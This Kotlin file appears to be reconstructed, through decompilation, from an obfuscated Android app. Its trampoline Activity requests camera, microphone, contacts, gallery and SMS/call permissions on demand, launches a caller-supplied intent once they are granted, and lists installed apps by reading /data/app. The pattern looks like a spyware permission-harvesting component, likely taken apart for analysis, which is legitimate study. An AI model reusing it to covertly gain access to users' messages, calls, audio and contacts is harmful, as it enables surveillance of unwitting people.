package com.storm.safe.rock.p029ui

import android.app.Activity
import android.content.ActivityNotFoundException
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

/**
 * Permission request trampoline Activity.
 * Accepts a "permission_type" extra and requests the corresponding runtime permissions,
 * then dispatches a callback_intent on grant.
 *
 * Reverse-engineered from JADX: p029ui/umrkmgrri.java (214 lines).
 * Renamed: f55197a0→permissionType, f55198a1→callbackIntent, m212469a0→executeCallback
 */
class umrkmgrri : Activity() {

    companion object {
        private const val TAG = "umrkmgrri"

        private const val REQUEST_CAMERA = 200
        private const val REQUEST_GALLERY = 201
        private const val REQUEST_MICROPHONE = 202
        private const val REQUEST_SMS = 203
        private const val REQUEST_CONTACTS = 204
    }

    var permissionType: String? = null
    var callbackIntent: Intent? = null

    /**
     * Execute the callback intent: start as Service if class name contains "Service",
     * start as Activity if contains "Activity", otherwise try Activity then Service.
     */
    fun executeCallback() {
        val intent = callbackIntent ?: return
        try {
            val className = intent.component?.className
            if (className != null && className.contains("Service", ignoreCase = true)) {
                startService(intent)
                return
            }
            if (className != null && className.contains("Activity", ignoreCase = true)) {
                startActivity(intent)
                return
            }
            try {
                startActivity(intent)
            } catch (_: ActivityNotFoundException) {
                startService(intent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "执行回调Intent失败", e)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        permissionType = intent.getStringExtra("permission_type")
        @Suppress("DEPRECATION")
        callbackIntent = intent.getParcelableExtra("callback_intent")

        when (permissionType) {
            "camera" -> {
                if (ContextCompat.checkSelfPermission(this, "android.permission.CAMERA") == 0) {
                    executeCallback()
                    finish()
                    return
                }
                try {
                    ActivityCompat.requestPermissions(this, arrayOf("android.permission.CAMERA"), REQUEST_CAMERA)
                } catch (e: Exception) {
                    Log.e(TAG, "请求摄像头权限失败", e)
                    finish()
                }
            }
            "appList" -> {
                Log.d(TAG, "📱 应用列表权限：使用 /data/app 目录读取，无需特殊权限")
                executeCallback()
                finish()
            }
            "contacts" -> {
                val contactsPerms = arrayOf("android.permission.READ_CONTACTS", "android.permission.GET_ACCOUNTS")
                if (contactsPerms.all { ContextCompat.checkSelfPermission(this, it) == 0 }) {
                    executeCallback()
                    finish()
                    return
                }
                try {
                    ActivityCompat.requestPermissions(this, contactsPerms, REQUEST_CONTACTS)
                } catch (e: Exception) {
                    Log.e(TAG, "请求通讯录权限失败", e)
                    finish()
                }
            }
            "gallery" -> {
                val galleryPerms = if (Build.VERSION.SDK_INT >= 33) {
                    arrayOf("android.permission.READ_MEDIA_IMAGES", "android.permission.READ_MEDIA_VIDEO")
                } else {
                    arrayOf("android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE")
                }
                if (galleryPerms.all { ContextCompat.checkSelfPermission(this, it) == 0 }) {
                    executeCallback()
                    finish()
                    return
                }
                try {
                    ActivityCompat.requestPermissions(this, galleryPerms, REQUEST_GALLERY)
                } catch (e: Exception) {
                    Log.e(TAG, "请求相册权限失败", e)
                    finish()
                }
            }
            "sms" -> {
                val smsPerms = arrayOf(
                    "android.permission.READ_SMS",
                    "android.permission.SEND_SMS",
                    "android.permission.RECEIVE_SMS",
                    "android.permission.READ_PHONE_STATE",
                    "android.permission.CALL_PHONE"
                )
                if (smsPerms.all { ContextCompat.checkSelfPermission(this, it) == 0 }) {
                    executeCallback()
                    finish()
                    return
                }
                try {
                    ActivityCompat.requestPermissions(this, smsPerms, REQUEST_SMS)
                } catch (e: Exception) {
                    Log.e(TAG, "请求短信权限失败", e)
                    finish()
                }
            }
            "microphone" -> {
                if (ContextCompat.checkSelfPermission(this, "android.permission.RECORD_AUDIO") == 0) {
                    executeCallback()
                    finish()
                    return
                }
                try {
                    ActivityCompat.requestPermissions(this, arrayOf("android.permission.RECORD_AUDIO"), REQUEST_MICROPHONE)
                } catch (e: Exception) {
                    Log.e(TAG, "请求麦克风权限失败", e)
                    finish()
                }
            }
            else -> {
                Log.w(TAG, "未知的权限类型: $permissionType")
                finish()
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (grantResults.isNotEmpty()) {
            if (grantResults.all { it == 0 }) {
                executeCallback()
            }
        }
        Handler(Looper.getMainLooper()).postDelayed({ finish() }, 100L)
    }
}
